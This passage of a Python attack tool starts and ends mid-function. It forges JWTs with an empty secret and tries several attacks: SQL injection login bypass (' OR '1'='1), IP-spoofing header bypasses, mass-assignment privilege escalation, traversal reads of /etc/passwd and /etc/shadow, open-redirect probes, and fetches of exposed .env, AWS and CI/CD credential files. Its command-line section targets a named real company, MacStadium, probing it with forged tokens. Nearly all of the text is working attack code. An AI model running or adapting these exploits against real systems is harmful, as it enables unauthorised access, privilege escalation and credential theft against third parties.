                                f'POST /oauth/token with scope={scope_val!r} granted '
                                f'{len(granted_list)} scopes without downscoping — '
                                'server should restrict to the minimum scope required. '
                                f'Granted: {granted!r}'
                            ),
                            'host': host,
                            'port': port,
                        })
                    break
            except (json.JSONDecodeError, ValueError):
                pass

    # 3. Admin endpoint with a user-tier token (role=user, empty HS256 secret)
    user_token = forge_token(
        {'sub': 'user', 'role': 'user', 'email': 'user@test.local'},
        secret=b'',
        alg='HS256',
    )
    sc3, body3 = _http_get(
        f'{base}/api/v1/admin',
        headers={'Authorization': f'Bearer {user_token}', 'Accept': 'application/json'},
        timeout=timeout,
    )
    if sc3 == 200 and body3:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ADMIN_ENDPOINT_ACCESSIBLE_WITH_USER_TOKEN',
            'detail':   (
                'GET /api/v1/admin returned 200 with a role=user HS256 token (empty secret) — '
                'admin endpoint does not enforce role-based access control; '
                'horizontal privilege escalation from user to admin tier. '
                f'Response excerpt: {body3[:200]}'
            ),
            'host': host,
            'port': port,
        })

    return findings


def probe_web_auth_bypass(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """Probe for HTTP header-based auth bypass and SQL injection login.

    Source: Violent Python Ch.6 (automated web interaction and reconnaissance);
    OWASP WSTG-AUTHZ-002 (authorization bypass via HTTP header manipulation);
    classic OR-1=1 SQLi tautology (login bypass via unsanitized username field).

    Probes:
      GET /admin               X-Forwarded-For: 127.0.0.1
           200                 -> CRITICAL ADMIN_BYPASS_X_FORWARDED_FOR
      GET /api/admin           X-Real-IP: 127.0.0.1
           200                 -> CRITICAL ADMIN_BYPASS_X_REAL_IP
      GET /api/v1/users        X-Original-URL: /api/v1/admin
           200                 -> HIGH     URL_OVERRIDE_POSSIBLE
      POST /api/auth/login     username=' OR '1'='1
           200 + token         -> CRITICAL SQL_INJECTION_LOGIN_BYPASS

    Args:
        host:    Target hostname or IP.
        port:    Target port (default 443).
        timeout: Per-request timeout in seconds.

    Returns:
        list of {severity, title, detail, host, port}
    """
    scheme = 'https' if port in (443, 8443) else 'http'
    base   = f'{scheme}://{host}:{port}'
    findings: list = []

    # 1. X-Forwarded-For admin panel bypass
    sc, body = _http_get(
        f'{base}/admin',
        headers={'X-Forwarded-For': '127.0.0.1', 'Accept': 'application/json'},
        timeout=timeout,
    )
    if sc == 200:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ADMIN_BYPASS_X_FORWARDED_FOR',
            'detail':   (
                'GET /admin with X-Forwarded-For: 127.0.0.1 returned HTTP 200 — '
                'server trusts X-Forwarded-For for IP-based access control; '
                'admin panel accessible via IP spoofing header. '
                f'Response excerpt: {(body or "")[:200]}'
            ),
            'host': host,
            'port': port,
        })

    # 2. X-Real-IP admin endpoint bypass
    sc2, body2 = _http_get(
        f'{base}/api/admin',
        headers={'X-Real-IP': '127.0.0.1', 'Accept': 'application/json'},
        timeout=timeout,
    )
    if sc2 == 200:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ADMIN_BYPASS_X_REAL_IP',
            'detail':   (
                'GET /api/admin with X-Real-IP: 127.0.0.1 returned HTTP 200 — '
                'server trusts X-Real-IP header for IP-based access control; '
                'admin endpoint accessible via IP spoofing header. '
                f'Response excerpt: {(body2 or "")[:200]}'
            ),
            'host': host,
            'port': port,
        })

    # 3. X-Original-URL routing override
    sc3, body3 = _http_get(
        f'{base}/api/v1/users',
        headers={
            'X-Original-URL': '/api/v1/admin',
            'Accept': 'application/json',
        },
        timeout=timeout,
    )
    if sc3 == 200:
        findings.append({
            'severity': 'HIGH',
            'title':    'URL_OVERRIDE_POSSIBLE',
            'detail':   (
                'GET /api/v1/users with X-Original-URL: /api/v1/admin returned HTTP 200 — '
                'reverse proxy or framework honors X-Original-URL header; '
                'attacker can route request to restricted endpoints by overriding the URL. '
                f'Response excerpt: {(body3 or "")[:200]}'
            ),
            'host': host,
            'port': port,
        })

    # 4. SQL injection login bypass — OR 1=1 tautology in username field
    sqli_payload = {"username": "' OR '1'='1", "password": "x"}
    sc4, body4 = _http_post(
        f'{base}/api/auth/login',
        data=sqli_payload,
        headers={'Accept': 'application/json'},
        timeout=timeout,
    )
    if sc4 == 200 and body4:
        try:
            resp4 = json.loads(body4)
            has_token = bool(
                resp4.get('token') or resp4.get('access_token') or
                resp4.get('jwt') or resp4.get('auth_token')
            )
            if has_token:
                findings.append({
                    'severity': 'CRITICAL',
                    'title':    'SQL_INJECTION_LOGIN_BYPASS',
                    'detail':   (
                        "POST /api/auth/login with username=' OR '1'='1 returned HTTP 200 "
                        "with an auth token — server does not parameterize the login query; "
                        "authentication bypassed via classic OR-tautology SQLi. "
                        f'Response excerpt: {body4[:200]}'
                    ),
                    'host': host,
                    'port': port,
                })
        except (json.JSONDecodeError, ValueError):
            pass

    return findings


def probe_api_mass_assignment(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """Probe for mass assignment vulnerabilities in API registration and update endpoints.

    Source: Violent Python Ch.6 (automated HTTP interaction with web services);
    OWASP API Security API3:2023 (Broken Object Property Level Authorization);
    mass assignment root cause: frameworks that bind all request fields to a model
    without an explicit property whitelist allow callers to set privileged attributes.

    Probes:
      POST /api/users or /api/v1/users   role=admin, is_admin=true
           201/200 + admin role reflected -> CRITICAL MASS_ASSIGNMENT_ROLE_ESCALATION
      PATCH /api/v1/profile              is_admin=true
           200 + field reflected          -> CRITICAL MASS_ASSIGNMENT_PRIVILEGE_ESCALATION
      POST /api/register                 balance=99999
           200/201 + balance reflected    -> HIGH     MASS_ASSIGNMENT_FINANCIAL_FIELD
      PUT  /api/v1/users/1               internal_id=9999
           200                            -> HIGH     MASS_ASSIGNMENT_INTERNAL_FIELD

    Args:
        host:    Target hostname or IP.
        port:    Target port (default 443).
        timeout: Per-request timeout in seconds.

    Returns:
        list of {severity, title, detail, host, port}
    """
    scheme = 'https' if port in (443, 8443) else 'http'
    base   = f'{scheme}://{host}:{port}'
    findings: list = []

    def _method_request(url, data, method, extra_headers=None):
        """urllib PATCH/PUT helper — stdlib only, TLS verify disabled."""
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        body_bytes = json.dumps(data).encode()
        hdrs = {'Content-Type': 'application/json', 'Accept': 'application/json'}
        hdrs.update(extra_headers or {})
        try:
            req = urllib.request.Request(url, data=body_bytes, headers=hdrs, method=method)
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                return resp.status, resp.read().decode('utf-8', errors='replace')
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode('utf-8', errors='replace')
        except Exception as e:
            return None, str(e)

    # 1. Role escalation via user creation — try both common registration paths
    for reg_path in ('/api/users', '/api/v1/users'):
        reg_payload = {
            'username': 'testuser_ablation',
            'password': 'Ablati0n!Test',
            'email':    'testuser@ablation.local',
            'role':     'admin',
            'is_admin': True,
        }
        sc, body = _http_post(
            f'{base}{reg_path}',
            data=reg_payload,
            headers={'Accept': 'application/json'},
            timeout=timeout,
        )
        if sc in (200, 201) and body:
            try:
                resp = json.loads(body)
                role_reflected = (
                    resp.get('role') in ('admin', 'administrator', 'superuser') or
                    resp.get('is_admin') is True
                )
                if role_reflected:
                    findings.append({
                        'severity': 'CRITICAL',
                        'title':    'MASS_ASSIGNMENT_ROLE_ESCALATION',
                        'detail':   (
                            f'POST {reg_path} with role=admin and is_admin=true returned '
                            f'HTTP {sc} with privileged role reflected in response — '
                            'framework binds all request fields to the user model without '
                            'a property whitelist; attacker self-assigns admin role at creation. '
                            f'Response excerpt: {body[:200]}'
                        ),
                        'host': host,
                        'port': port,
                    })
                    break
            except (json.JSONDecodeError, ValueError):
                pass

    # 2. Privilege escalation via profile PATCH
    sc2, body2 = _method_request(
        f'{base}/api/v1/profile',
        data={'is_admin': True},
        method='PATCH',
    )
    if sc2 == 200 and body2:
        try:
            resp2 = json.loads(body2)
            if resp2.get('is_admin') is True:
                findings.append({
                    'severity': 'CRITICAL',
                    'title':    'MASS_ASSIGNMENT_PRIVILEGE_ESCALATION',
                    'detail':   (
                        'PATCH /api/v1/profile with {"is_admin": true} returned HTTP 200 '
                        'with is_admin reflected as true — profile update endpoint does not '
                        'strip privileged fields from the request body; '
                        'any authenticated user can self-escalate to admin. '
                        f'Response excerpt: {body2[:200]}'
                    ),
                    'host': host,
                    'port': port,
                })
        except (json.JSONDecodeError, ValueError):
            pass

    # 3. Financial field injection via registration
    sc3, body3 = _http_post(
        f'{base}/api/register',
        data={'username': 'testfin_ablation', 'password': 'Ablati0n!Test', 'balance': 99999},
        headers={'Accept': 'application/json'},
        timeout=timeout,
    )
    if sc3 in (200, 201) and body3:
        try:
            resp3 = json.loads(body3)
            if resp3.get('balance') is not None:
                findings.append({
                    'severity': 'HIGH',
                    'title':    'MASS_ASSIGNMENT_FINANCIAL_FIELD',
                    'detail':   (
                        'POST /api/register with balance=99999 returned HTTP '
                        f'{sc3} with balance={resp3.get("balance")} reflected — '
                        'registration endpoint accepts and persists caller-supplied '
                        'financial fields; attacker sets arbitrary starting balance. '
                        f'Response excerpt: {body3[:200]}'
                    ),
                    'host': host,
                    'port': port,
                })
        except (json.JSONDecodeError, ValueError):
            pass

    # 4. Internal field injection via user PUT
    sc4, body4 = _method_request(
        f'{base}/api/v1/users/1',
        data={'internal_id': 9999},
        method='PUT',
    )
    if sc4 == 200:
        findings.append({
            'severity': 'HIGH',
            'title':    'MASS_ASSIGNMENT_INTERNAL_FIELD',
            'detail':   (
                'PUT /api/v1/users/1 with {"internal_id": 9999} returned HTTP 200 — '
                'user update endpoint does not reject internal/system-reserved fields; '
                'attacker may corrupt internal state or bypass business logic '
                'tied to internal_id references. '
                f'Response excerpt: {(body4 or "")[:200]}'
            ),
            'host': host,
            'port': port,
        })

    return findings


def probe_directory_traversal_surface(host: str, port: int = 80, timeout: float = 10.0) -> list:
    """Detect directory traversal vulnerability surface.

    Sends traversal-sequence payloads to common file-serving endpoints and
    inspects responses for evidence of local filesystem disclosure.

    Traversal sequences tested:
      /api/v1/files?path=../../../etc/passwd
      /download?file=../../../../etc/shadow
      /static/../../../etc/passwd
      /images/%2e%2e%2f%2e%2e%2fetc%2fpasswd  (URL-encoded)
      /files?name=....//....//etc/passwd       (double-dot bypass)

    Detection signals:
      root:/bin/bash or daemon: patterns -> CRITICAL DIRECTORY_TRAVERSAL_RCE_SURFACE
      Windows/Linux path strings in body   -> HIGH    PATH_DISCLOSURE
      Status 200 + file content patterns   -> CRITICAL DIRECTORY_TRAVERSAL_CONFIRMED
      Status 200 but no path content       -> HIGH    POTENTIAL_TRAVERSAL_SURFACE

    Tries both HTTP and HTTPS.

    Args:
        host:    Target hostname or IP.
        port:    Target port (default 80).
        timeout: Per-request timeout in seconds.

    Returns:
        list of {severity, title, detail, host, port}
    """
    import ssl
    import urllib.request
    import urllib.error

    findings: list = []

    _UNIX_FILE_RE = re.compile(
        r'(root:[x*]?:\d+:\d+|daemon:[x*]?:\d+:\d+|nobody:[x*]?:\d+:\d+|/bin/bash|/bin/sh)',
        re.MULTILINE,
    )
    _PATH_DISCLOSURE_RE = re.compile(
        r'(/etc/|/var/|/home/|/usr/|C:\\Windows\\|C:\\Users\\|\\Windows\\System32)',
        re.IGNORECASE,
    )

    traversal_paths = [
        '/api/v1/files?path=../../../etc/passwd',
        '/download?file=../../../../etc/shadow',
        '/static/../../../etc/passwd',
        '/images/%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '/files?name=....//....//etc/passwd',
    ]

    def _ssl_ctx_no_verify():
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx

    def _get(scheme, path):
        url = f'{scheme}://{host}:{port}{path}'
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        try:
            ctx = _ssl_ctx_no_verify() if scheme == 'https' else None
            kwargs = {'timeout': timeout}
            if ctx:
                kwargs['context'] = ctx
            with urllib.request.urlopen(req, **kwargs) as resp:
                body = resp.read(32768).decode('utf-8', errors='replace')
                return resp.status, body
        except urllib.error.HTTPError as exc:
            return exc.code, ''
        except Exception:
            return None, ''

    schemes = ['https', 'http'] if port in (443, 8443) else ['http', 'https']

    seen_titles: set = set()

    def _add(severity, title, detail):
        key = (title, severity)
        if key not in seen_titles:
            seen_titles.add(key)
            findings.append({'severity': severity, 'title': title,
                             'detail': detail, 'host': host, 'port': port})

    for scheme in schemes:
        for path in traversal_paths:
            status, body = _get(scheme, path)
            if status is None:
                continue

            if status == 200 and body:
                if _UNIX_FILE_RE.search(body):
                    _add(
                        'CRITICAL',
                        'DIRECTORY_TRAVERSAL_RCE_SURFACE',
                        (
                            f'Unix passwd/shadow file content returned from '
                            f'{scheme}://{host}:{port}{path} — '
                            f'root/daemon/nobody entry or shell path detected. '
                            f'Excerpt: {body[:200].strip()}'
                        ),
                    )
                    _add(
                        'CRITICAL',
                        'DIRECTORY_TRAVERSAL_CONFIRMED',
                        (
                            f'Directory traversal confirmed: file content readable via '
                            f'{scheme}://{host}:{port}{path}'
                        ),
                    )
                elif _PATH_DISCLOSURE_RE.search(body):
                    _add(
                        'HIGH',
                        'PATH_DISCLOSURE',
                        (
                            f'Filesystem path string leaked in response from '
                            f'{scheme}://{host}:{port}{path}. '
                            f'Excerpt: {body[:200].strip()}'
                        ),
                    )
                else:
                    _add(
                        'HIGH',
                        'POTENTIAL_TRAVERSAL_SURFACE',
                        (
                            f'Traversal endpoint returned HTTP 200 for '
                            f'{scheme}://{host}:{port}{path} — '
                            f'no clear file content pattern, manual verification required.'
                        ),
                    )

    return findings


def probe_open_redirect_surface(host: str, port: int = 80, timeout: float = 10.0) -> list:
    """Detect open redirect vulnerability surface (OAuth flows, login redirects).

    Tests redirect parameters on common endpoints and checks whether the server
    follows attacker-controlled Location headers.

    Endpoints and parameters tested:
      /?redirect=, /?url=, /?next=, /?return_url=, /?callback=, /?target=
      /login?redirect_uri=, /oauth/authorize?redirect_uri=
      /logout?next=, /auth?returnTo=

    Canary domain: https://evil.com (never routable; used only as a marker)

    Detection signals:
      301/302 Location: evil.com           -> CRITICAL OPEN_REDIRECT_CONFIRMED
      Location: javascript:               -> CRITICAL JS_REDIRECT_XSS
      200 + window.location = (user input) -> HIGH    CLIENT_SIDE_REDIRECT

    Aggregates all confirmed redirects with parameter name in detail.

    Tries both HTTP and HTTPS.

    Args:
        host:    Target hostname or IP.
        port:    Target port (default 80).
        timeout: Per-request timeout in seconds.

    Returns:
        list of {severity, title, detail, host, port}
    """
    import ssl
    import urllib.request
    import urllib.error

    CANARY = 'https://evil.com'
    JS_CANARY = 'javascript:alert(1)'

    findings: list = []

    redirect_params = [
        ('/', 'redirect'),
        ('/', 'url'),
        ('/', 'next'),
        ('/', 'return_url'),
        ('/', 'callback'),
        ('/', 'target'),
        ('/login', 'redirect_uri'),
        ('/oauth/authorize', 'redirect_uri'),
        ('/logout', 'next'),
        ('/auth', 'returnTo'),
    ]

    _CLIENT_REDIRECT_RE = re.compile(
        r'window\.location\s*=\s*[\'"]?https?://evil\.com',
        re.IGNORECASE,
    )

    def _ssl_ctx_no_verify():
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx

    def _get_no_follow(scheme, path):
        """Fetch path without following redirects; return (status, location, body)."""
        url = f'{scheme}://{host}:{port}{path}'
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        try:
            ctx = _ssl_ctx_no_verify() if scheme == 'https' else None

            class _NoRedirect(urllib.request.HTTPRedirectHandler):
                def redirect_request(self, req, fp, code, msg, headers, newurl):
                    return None

            opener = urllib.request.build_opener(_NoRedirect)
            if ctx:
                opener = urllib.request.build_opener(
                    _NoRedirect,
                    urllib.request.HTTPSHandler(context=ctx),
                )
            try:
                with opener.open(req, timeout=timeout) as resp:
                    body = resp.read(16384).decode('utf-8', errors='replace')
                    location = resp.headers.get('Location', '')
                    return resp.status, location, body
            except urllib.error.HTTPError as exc:
                location = exc.headers.get('Location', '') if exc.headers else ''
                return exc.code, location, ''
        except Exception:
            return None, '', ''

    schemes = ['https', 'http'] if port in (443, 8443) else ['http', 'https']

    confirmed_redirects: list = []
    js_redirects: list = []
    client_redirects: list = []

    for scheme in schemes:
        for base_path, param in redirect_params:
            for canary_url in (CANARY, JS_CANARY):
                sep = '&' if '?' in base_path else '?'
                path = f'{base_path}{sep}{param}={urllib.parse.quote(canary_url, safe=":/")}'

                status, location, body = _get_no_follow(scheme, path)
                if status is None:
                    continue

                if status in (301, 302, 303, 307, 308) and location:
                    if 'javascript:' in location.lower():
                        js_redirects.append(
                            f'{scheme}://{host}:{port}{path} -> Location: {location}'
                        )
                    elif 'evil.com' in location:
                        confirmed_redirects.append(
                            f'param={param!r} at {base_path} -> Location: {location} (HTTP {status})'
                        )
                elif status == 200 and body and _CLIENT_REDIRECT_RE.search(body):
                    client_redirects.append(
                        f'{scheme}://{host}:{port}{path} returned 200 with '
                        f'window.location=evil.com in body'
                    )

    def _add(severity, title, detail):
        findings.append({'severity': severity, 'title': title,
                         'detail': detail, 'host': host, 'port': port})

    if confirmed_redirects:
        _add(
            'CRITICAL',
            'OPEN_REDIRECT_CONFIRMED',
            (
                f'Open redirect confirmed — server follows attacker-controlled redirect_uri. '
                f'Confirmed parameter(s): {"; ".join(confirmed_redirects)}'
            ),
        )

    if js_redirects:
        _add(
            'CRITICAL',
            'JS_REDIRECT_XSS',
            (
                f'javascript: URI accepted in Location header — XSS via open redirect. '
                f'Instances: {"; ".join(js_redirects)}'
            ),
        )

    if client_redirects:
        _add(
            'HIGH',
            'CLIENT_SIDE_REDIRECT',
            (
                f'Client-side redirect using unvalidated input detected in HTML body. '
                f'Instances: {"; ".join(client_redirects)}'
            ),
        )

    return findings


# ── CLI ───────────────────────────────────────────────────────────────────────

if __name__ == '__main__':
    import sys

    args = sys.argv[1:]
    if not args:
        print(
            "Usage: jwt_crypto_analyzer.py <token|file> [options]\n"
            "Options:\n"
            "  --probe              Probe MacStadium with forged tokens\n"
            "  --forge              Print forged tokens for all MacStadium payloads\n"
            "  --confusion <pem>    RS256->HS256 algorithm confusion (provide PEM file)\n"
            "  --jwks <base_url>    Probe JWKS endpoints at base_url\n"
            "  --kid [sub] [email]  Generate kid injection payloads\n"
            "  --exp                Generate exp claim manipulation payloads\n"
        )
        sys.exit(0)

    target   = args[0] if not args[0].startswith('--') else None
    do_probe = '--probe' in args
    do_forge = '--forge' in args
    do_confusion = '--confusion' in args
    do_jwks  = '--jwks' in args
    do_kid   = '--kid' in args
    do_exp   = '--exp' in args

    ana = JWTCryptoAnalyzer()

    # Analyze token or file
    if target:
        if target.startswith('eyJ') and '.' in target:
            print(f"[*] Analyzing JWT token...")
            ana.analyze_token(target)
        elif Path(target).exists():
            print(f"[*] Scanning file: {target}")
            result = ana.analyze_file(target)
            print(f"[*] Found {result['tokens_found']} JWTs")
        else:
            print(f"[!] Not a JWT token or existing file: {target}")
            sys.exit(1)

    print(ana.report())

    if do_probe:
        print("\n[*] Probing MacStadium targets with forged tokens...")
        results = ana.probe_macstadium_all()
        for r in results:
            print(f"\n  Payload: {r['payload']['sub']}")
            print(f"  Token: {r['token'][:60]}...")
            for p in r['probes']:
                if p['status'] == 200:
                    print(f"  [HIT] {p['endpoint']} -> {p['status']}")
                    print(f"        {p['body_excerpt'][:100]}")

    if do_forge:
        for payload in MACSTADIUM_FORGE_PAYLOADS:
            token = forge_token(payload, secret=b'', alg='HS256')
            print(f"\n[FORGE] {payload['sub']}: {token}")

    if do_confusion:
        # Read PEM file from next argument after --confusion
        idx = args.index('--confusion')
        if idx + 1 < len(args):
            pem_file = args[idx + 1]
            try:
                with open(pem_file, 'rb') as f:
                    pem = f.read()
                token_for_confusion = target or forge_token(MACSTADIUM_FORGE_PAYLOADS[0], secret=b'')
                print(f"\n[*] Running RS256->HS256 algorithm confusion with {pem_file}...")
                forged = ana.run_algorithm_confusion(token_for_confusion, pem)
                if forged:
                    print(f"[CONFUSION] Forged token: {forged[:80]}...")
            except FileNotFoundError:
                print(f"[!] PEM file not found: {pem_file}")
        else:
            print("[!] --confusion requires a PEM file argument")

    if do_jwks:
        idx = args.index('--jwks')
        base_url = args[idx + 1] if idx + 1 < len(args) else MACSTADIUM_IDP
        print(f"\n[*] Probing JWKS endpoints at {base_url}...")
        jwks_results = ana.run_jwks_probe(base_url=base_url)
        for r in jwks_results:
            if r['status'] == 200:
                print(f"  [HIT] {r['url']} -> {r['status']}: {len(r['keys'])} key(s)")
                for k in r['keys']:
                    print(f"    kid={k['kid']} kty={k['kty']} alg={k['alg']}")

    if do_kid:
        idx  = args.index('--kid')
        sub  = args[idx + 1] if idx + 1 < len(args) and not args[idx+1].startswith('--') else 'admin'
        email = args[idx + 2] if idx + 2 < len(args) and not args[idx+2].startswith('--') else f'{sub}@macstadium.com'
        payload = {'sub': sub, 'email': email, 'role': 'admin', 'is_admin': True}
        print(f"\n[*] Generating kid injection payloads for sub={sub!r}...")
        kid_attacks = ana.run_kid_injection(payload=payload)
        for a in kid_attacks:
            print(f"\n  [{a['attack_class']}] kid={a['kid']!r}")
            print(f"  Secret: {a.get('secret_used')}")
            print(f"  Token: {a['token'][:70]}...")

    if do_exp and target and target.startswith('eyJ'):
        print(f"\n[*] Generating exp manipulation attack payloads...")
        exp_attacks = ana.run_exp_bypass(target, secret=b'')
        for a in exp_attacks:
            if 'error' not in a:
                print(f"\n  [{a['attack_class']}] exp={a.get('exp_value')}")
                print(f"  {a['description']}")
                print(f"  Token: {a['token'][:70]}...")


def probe_exposed_env_and_config_files(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """Probe for exposed environment and repository configuration files.

    Supply-chain credential exposure: publicly accessible .env, .git/config,
    .git/HEAD, and .dockerenv files reveal secrets, repo topology, and container
    context that enable lateral movement and credential stuffing.

    Probes:
      GET /.env                -> credential keywords -> CRITICAL ENV_FILE_EXPOSED
      GET /.git/config         -> [remote]/[branch]   -> CRITICAL GIT_CONFIG_EXPOSED
      GET /.git/HEAD           -> ref: / 40-char hex  -> HIGH     GIT_HEAD_EXPOSED
      GET /.dockerenv          -> 200                 -> HIGH     DOCKERENV_EXPOSED
      GET /api/.env            -> credential keywords -> CRITICAL ENV_FILE_EXPOSED
      GET /config/.env         -> credential keywords -> CRITICAL ENV_FILE_EXPOSED
      GET /backend/.env        -> credential keywords -> CRITICAL ENV_FILE_EXPOSED

    Args:
        host:    Target hostname or IP.
        port:    Target port (default 443).
        timeout: Per-request timeout in seconds.

    Returns:
        list of {severity, title, detail, host, port}
    """
    scheme = 'https' if port in (443, 8443) else 'http'
    base = f'{scheme}://{host}:{port}'
    findings: list = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    _ENV_CRED_RE = re.compile(
        r'(?i)(KEY\s*=|PASSWORD\s*=|SECRET\s*=|TOKEN\s*=)',
        re.MULTILINE,
    )
    _GIT_CFG_RE = re.compile(r'\[(remote|branch)\s', re.IGNORECASE)
    _GIT_HEAD_RE = re.compile(r'^(ref:\s|[0-9a-f]{40})', re.IGNORECASE)

    def _get(path: str):
        url = f'{base}{path}'
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                body = resp.read(8192).decode('utf-8', errors='replace')
                return resp.status, body
        except urllib.error.HTTPError as exc:
            return exc.code, ''
        except Exception:
            return None, ''

    def _finding(severity, title, detail):
        findings.append({'severity': severity, 'title': title, 'detail': detail,
                         'host': host, 'port': port})

    # .env paths
    for env_path in ('/.env', '/api/.env', '/config/.env', '/backend/.env'):
        status, body = _get(env_path)
        if status == 200 and _ENV_CRED_RE.search(body):
            _finding(
                'CRITICAL',
                'ENV_FILE_EXPOSED',
                f'.env file with credentials accessible at {base}{env_path}',
            )

    # .git/config
    status, body = _get('/.git/config')
    if status == 200 and _GIT_CFG_RE.search(body):
        _finding(
            'CRITICAL',
            'GIT_CONFIG_EXPOSED',
            f'.git/config exposed at {base}/.git/config (repo URL, branch info)',
        )

    # .git/HEAD
    status, body = _get('/.git/HEAD')
    if status == 200 and _GIT_HEAD_RE.search(body.strip()):
        _finding(
            'HIGH',
            'GIT_HEAD_EXPOSED',
            f'.git/HEAD exposed at {base}/.git/HEAD (repo commit SHA or ref)',
        )

    # .dockerenv
    status, _ = _get('/.dockerenv')
    if status == 200:
        _finding(
            'HIGH',
            'DOCKERENV_EXPOSED',
            f'.dockerenv marker at {base}/.dockerenv confirms container environment',
        )

    return findings


def probe_cicd_credential_exposure(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """Probe for exposed CI/CD pipeline files containing credential references.

    Exposed Jenkinsfiles, GitHub Actions workflows, Terraform variable files,
    and AWS credential files reveal secret names, IAM keys, and deployment
    credential patterns that enable direct cloud account takeover or secret
    enumeration from the pipeline configuration.

    Probes:
      GET /Jenkinsfile                           -> credentials()/withCredentials -> HIGH  JENKINSFILE_EXPOSED
      GET /github-actions.yml                    -> secrets.* / AWS_SECRET        -> CRIT  GITHUB_ACTIONS_SECRETS_EXPOSED
      GET /.github/workflows/deploy.yml          -> secrets.* / AWS_SECRET        -> CRIT  GITHUB_ACTIONS_SECRETS_EXPOSED
      GET /terraform.tfvars                      -> access_key/secret_key         -> CRIT  TERRAFORM_TFVARS_EXPOSED
      GET /.aws/credentials                      -> [default]+aws_access_key_id   -> CRIT  AWS_CREDS_EXPOSED

    Args:
        host:    Target hostname or IP.
        port:    Target port (default 443).
        timeout: Per-request timeout in seconds.

    Returns:
        list of {severity, title, detail, host, port}
    """
    scheme = 'https' if port in (443, 8443) else 'http'
    base = f'{scheme}://{host}:{port}'
    findings: list = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    _JENKINS_RE = re.compile(r'(credentials\s*\(|withCredentials\s*\[)', re.IGNORECASE)
    _GHA_SECRET_RE = re.compile(r'(secrets\.[A-Z_]+|AWS_SECRET)', re.IGNORECASE)
    _TF_CRED_RE = re.compile(r'(access_key|secret_key)\s*=', re.IGNORECASE)
    _AWS_CREDS_RE = re.compile(r'\[default\].*aws_access_key_id\s*=', re.DOTALL | re.IGNORECASE)

    def _get(path: str):
        url = f'{base}{path}'
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                body = resp.read(8192).decode('utf-8', errors='replace')
                return resp.status, body
        except urllib.error.HTTPError as exc:
            return exc.code, ''
        except Exception:
            return None, ''

    def _finding(severity, title, detail):
        findings.append({'severity': severity, 'title': title, 'detail': detail,
                         'host': host, 'port': port})

    # Jenkinsfile
    status, body = _get('/Jenkinsfile')
    if status == 200 and _JENKINS_RE.search(body):
        _finding(
            'HIGH',
            'JENKINSFILE_EXPOSED',
            f'Jenkinsfile with credential binding patterns at {base}/Jenkinsfile',
        )

    # GitHub Actions workflows
    for gha_path in ('/github-actions.yml', '/.github/workflows/deploy.yml'):
        status, body = _get(gha_path)
        if status == 200 and _GHA_SECRET_RE.search(body):
            _finding(
                'CRITICAL',
                'GITHUB_ACTIONS_SECRETS_EXPOSED',
                f'GitHub Actions workflow with secret references at {base}{gha_path}',
            )

    # Terraform tfvars
    status, body = _get('/terraform.tfvars')
    if status == 200 and _TF_CRED_RE.search(body):
        _finding(
            'CRITICAL',
            'TERRAFORM_TFVARS_EXPOSED',
            f'Terraform variables file with cloud credentials at {base}/terraform.tfvars',
        )

    # AWS credentials file
    status, body = _get('/.aws/credentials')
    if status == 200 and _AWS_CREDS_RE.search(body):
        _finding(
            'CRITICAL',
            'AWS_CREDS_EXPOSED',
            f'AWS credentials file publicly accessible at {base}/.aws/credentials',
        )

    return findings


def probe_webhook_credential_exposure(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """Probe for exposed webhook endpoints and notification service credentials.

    Webhook receivers and configuration APIs frequently appear alongside API
    tokens and secrets in the same codebase.  Unauthenticated access to webhook
    list endpoints leaks destination URLs, HMAC signing secrets, and service
    integration tokens that enable full service impersonation.

    Probes:
      GET /.well-known/security.txt    -> disclosure policy present     -> INFO  SECURITY_TXT_PRESENT
      GET /webhook                     -> receiver accessible           -> HIGH  WEBHOOK_ENDPOINT_EXPOSED
      GET /api/webhooks                -> config list (URLs + secrets)  -> CRIT  WEBHOOK_LIST_UNAUTH
      GET /api/v1/incoming_webhook     -> Mattermost endpoint open      -> HIGH  MATTERMOST_WEBHOOK_EXPOSED

    Args:
        host:    Target hostname or IP.
        port:    Target port (default 443).
        timeout: Per-request timeout in seconds.

    Returns:
        list of {severity, title, detail, host, port}
    """
    scheme = 'https' if port in (443, 8443) else 'http'
    base = f'{scheme}://{host}:{port}'
    findings: list = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _get(path: str):
        url = f'{base}{path}'
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                body = resp.read(8192).decode('utf-8', errors='replace')
                return resp.status, body
        except urllib.error.HTTPError as exc:
            return exc.code, ''
        except Exception:
            return None, ''

    def _finding(severity, title, detail):
        findings.append({'severity': severity, 'title': title, 'detail': detail,
                         'host': host, 'port': port})

    # Security disclosure policy
    status, body = _get('/.well-known/security.txt')
    if status == 200 and body.strip():
        _finding(
            'INFO',
            'SECURITY_TXT_PRESENT',
            f'security.txt disclosure policy present at {base}/.well-known/security.txt',
        )

    # Generic webhook receiver
    status, body = _get('/webhook')
    if status == 200:
        _finding(
            'HIGH',
